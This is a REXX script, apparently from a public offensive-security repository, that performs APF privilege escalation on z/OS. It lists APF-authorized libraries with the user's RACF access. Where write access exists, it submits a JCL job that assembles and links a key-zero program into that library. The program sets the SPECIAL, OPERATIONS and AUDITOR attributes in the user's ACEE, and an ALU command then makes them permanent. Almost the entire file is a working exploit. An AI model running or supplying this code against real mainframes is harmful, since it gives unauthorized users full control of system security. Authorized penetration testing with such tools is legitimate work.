/* REXX */

/****************************************************************************/
/*  ELV.APF is a tool to list APF authorized libraries and their privileges */
/*  If a library has the ALTER/UPDATE privilege, the tool can submit a JOB  */
/*  that compiles and launches a Prog to grant your user SPECIAL privileges */
/*                                                                          */
/*  No new techniques really but it's a handy script                        */
/*                                                                          */
/*  Requirements: Submit a JOB                                              */
/*  Usage : ex 'ELV.APF' 'list' to list APF libraries and their access right*/
/*          ex 'ELV.APF' 'APF_DSN' to have the SPECIAL privilege            */
/*                                                                          */
/*                                                                          */
/* Author: Ayoul3 (github.com/ayoul3)                                       */
/* Sources: http://www.cbttape.org/xephon/xephonr/rac0005.pdf               */
/*          http://mzelden.com/mvsutil.html                                 */
/* Check out : http://zdevops.github.io/zdosu/                              */
/****************************************************************************/

parse arg dsn_input verbose
parse source . . prg . name . . space .

say "+ APF Privilege Escalation Script"

if verbose == 'verbose' then do
    verbose = 1
    say '+ Verbose mode turned on'
end
else
    verbose = 0

if dsn_input == "" then do
    say "Usage: ex '"||name||"' 'list' to list apf libraries and "||,
  "their privileges"
    say "       ex '"||name||"' 'APF_DSN' to have the SPECIAL privilege "
    say "       ex '"||name||"' 'list verbose'"
    exit(-1)
end

if translate(dsn_input) =="LIST" then do
    list_apf()
end
else do
    call listdsi "'"dsn_input"'"

    if sysdsorg <> "PO" then do
        say "! Cannot find APF Library '"dsn_input"', or not PDS"
        exit(-1)
    end

    priv  =  check_priv(dsn_input)

    if (priv == "NONE") then do
        say "! Not enough privileges to alter APF library "dsn_input
        exit(-1)
    end

    if (priv == "READ") then do
        say "! Not enough privileges to alter APF library "dsn_input
        exit(-1)
    end
    if priv=="NO RACF PROFILE" then do
        say "! Warning: No RACF profile defined for"||,
   ""dsn_input", might not be uptable"
    end

    launch_payload(dsn_input)

end


launch_payload:
    APF_DSN = arg(1)
    PROG = rand_char(6)
    say "+ Compiling " PROG "in" dsn_input
    QUEUE "//ELVAPF  JOB (JOBNAME),'XSS',CLASS=A,NOTIFY=&SYSUID"
    QUEUE "//*"
    QUEUE "//BUILD   EXEC ASMACL"
    QUEUE "//C.SYSLIB  DD DSN=SYS1.SISTMAC1,DISP=SHR"
    QUEUE "//          DD DSN=SYS1.MACLIB,DISP=SHR"
    QUEUE "//C.SYSIN   DD *"
    QUEUE "       CSECT"
    QUEUE "       AMODE 31"
    QUEUE "       STM 14,12,12(13)"
    QUEUE "       BALR 12,0"
    QUEUE "       USING *,12"
    QUEUE "       ST 13,SAVE+4"
    QUEUE "       LA 13,SAVE"
    QUEUE "*"
    QUEUE "       MODESET KEY=ZERO,MODE=SUP"
    QUEUE "       L 5,X'224'           POINTER TO ASCB"
    QUEUE "       L 5,X'6C'(5)         POINTER TO ASXB"
    QUEUE "       L 5,X'C8'(5)         POINTER TO ACEE"
    QUEUE "       NI X'26'(5),X'00'"
    QUEUE "       OI X'26'(5),X'B1'    SPE + OPER + AUDITOR ATTR"
    QUEUE "       NI X'27'(5),X'00'"
    QUEUE "       OI X'27'(5),X'80'    ALTER ACCESS"
    QUEUE "*"
    QUEUE "       L 13,SAVE+4"
    QUEUE "       LM 14,12,12(13)"
    QUEUE "       XR 15,15"
    QUEUE "       BR 14"
    QUEUE "*"
    QUEUE "SAVE   DS 18F"
    QUEUE "    END"
    QUEUE "/*"
    QUEUE "//L.SYSLMOD DD DISP=SHR,DSN="||APF_DSN||""
    QUEUE "//L.SYSIN   DD *"
    QUEUE "  SETCODE AC(1)"
    QUEUE "  NAME "||PROG||"(R)"
    QUEUE "/*"
    QUEUE "//STEP01 EXEC PGM="||PROG||",COND=(0,NE)"
    QUEUE "//STEPLIB   DD DSN="||APF_DSN||",DISP=SHR"
    QUEUE "//STEP02 EXEC PGM=IKJEFT01,COND=(0,NE)"
    QUEUE "//SYSTSIN DD *"
    QUEUE " ALU "||userid()||" SPECIAL OPERATIONS"
    QUEUE "/*"
    QUEUE "//SYSIN   DD DUMMY"
    QUEUE "//SYSTSPRT DD SYSOUT=*"
    QUEUE "//*"
    QUEUE "$$"

    o = OUTTRAP("output.",,"CONCAT")
    address tso "SUBMIT * END($$)"
    o = OUTTRAP(OFF)

    exit(0)

rand_char:
    length = arg(1)
    out = ""
    do counter=0 to length
       i = RANDOM(1,3)
       if i ==1 then out = out||D2C(RANDOM(193,201))
       if i ==2 then out = out||D2C(RANDOM(226,233))
       if i ==3 then out = out||D2C(RANDOM(209,217))
    end
    return out

exit(0)
list_apf:
    NUMERIC  DIGITS 10
    CVT      = C2d(Storage(10,4))                /* point to cvt */
    GRSNAME  = Storage(D2x(CVT + 340),8)         /* point to system name */
    GRSNAME  = Strip(GRSNAME,'T')                /* del trailing blanks  */
    CVTAUTHL = C2d(Storage(D2x(CVT + 484),4))    /* point to auth lib tbl*/
    If CVTAUTHL <> C2d('7FFFF001'x) then do      /* static list ?        */
      NUMAPF   = C2d(Storage(D2x(CVTAUTHL),2))   /* # APF libs in table  */
      APFOFF   = 2                               /* first ent in APF tbl */
      Do I = 1 to NUMAPF
         LEN = C2d(Storage(D2x(CVTAUTHL+APFOFF),1)) /* length of entry   */
         VOL.I = Storage(D2x(CVTAUTHL+APFOFF+1),6)  /* VOLSER of APF LIB */
         DSN.I = Storage(D2x(CVTAUTHL+APFOFF+1+6),LEN-6) /*DSN of APF lib*/
         APFOFF = APFOFF + LEN +1
         say DSN.I
      End
    End
    Else Do  /* dynamic APF list via PROGxx */
      ECVT     = C2d(Storage(D2x(CVT + 140),4))  /* point to CVTECVT     */
      ECVTCSVT = C2d(Storage(D2x(ECVT + 228),4)) /* point to CSV table   */
      APFA = C2d(Storage(D2x(ECVTCSVT + 12),4))  /* APFA                 */
      AFIRST = C2d(Storage(D2x(APFA + 8),4))     /* First entry          */
      ALAST  = C2d(Storage(D2x(APFA + 12),4))    /* Last  entry          */
      LASTONE = 0   /* flag for end of list      */
      NUMAPF = 1    /* tot # of entries in list  */
      say "+ Dataset --> Access"
      Do forever
         DSN.NUMAPF = Storage(D2x(AFIRST+24),44) /* DSN of APF library   */
         DSN.NUMAPF = Strip(DSN.NUMAPF,'T')      /* remove blanks        */
         PRIV.NUMAPF = check_priv(DSN.NUMAPF)
         if verbose then
            say "+" DSN.NUMAPF "-->" PRIV.NUMAPF
         else if PRIV.NUMAPF == 'ALTER' then
            say "+" DSN.NUMAPF "-->" PRIV.NUMAPF
         CKSMS = Storage(D2x(AFIRST+4),1)        /* DSN of APF library   */
         if  bitand(CKSMS,'80'x)  = '80'x        /*  SMS data set?       */
           then VOL.NUMAPF = '*SMS* '            /* SMS control dsn      */
         else VOL.NUMAPF = Storage(D2x(AFIRST+68),6) /* VOLSER of APF lib*/
         If Substr(DSN.NUMAPF,1,1) <> X2c('00')  /* check for deleted    */
           then NUMAPF = NUMAPF + 1              /*   APF entry          */
         AFIRST = C2d(Storage(D2x(AFIRST + 8),4)) /* next  entry          */
         if LASTONE = 1 then leave
         If  AFIRST = ALAST then LASTONE = 1
      End
      NUMAPF = NUMAPF-1
End

exit(0)

check_priv:
  NOT_AUTH="NOT AUTHORIZED"
  NO_PROFILE="NO RACF"
  DSN = arg(1)

  /* First we Check for a specific rule */
  /* ICH35003I */
  A = OUTTRAP('OUT.')
    ADDRESS TSO "LD DA('"DSN"')"
  B = OUTTRAP('OFF')
  IF OUT.0==1 THEN DO
    IF INDEX(OUT.1,"ICH35003I") >0 THEN DO
      X = OUTTRAP('OUTG.')
        ADDRESS TSO "LD DA('"DSN"') GEN"
      Y = OUTTRAP('OFF')
      IF OUTG.0==1 THEN DO
        IF INDEX(OUTG.1,NOT_AUTH)>0 THEN
          RETURN "NONE"
        IF INDEX(OUTG.1,NO_PROFILE)>0 THEN
          RETURN "NO RACF PROFILE"
      END
      ELSE IF OUTG.0>1 THEN DO
        ACCESS = WORD(OUTG.17,1)
        return ACCESS
      END
    END
    IF INDEX(OUT.1,NOT_AUTH)>0 THEN
      RETURN "NONE"
    IF INDEX(OUT.1,NO_PROFILE)>0 THEN
      RETURN "NO RACF PROFILE"
  END
  ELSE IF OUT.0>1 THEN DO
    ACCESS = WORD(OUT.17,1)
    return ACCESS
  END
return -1
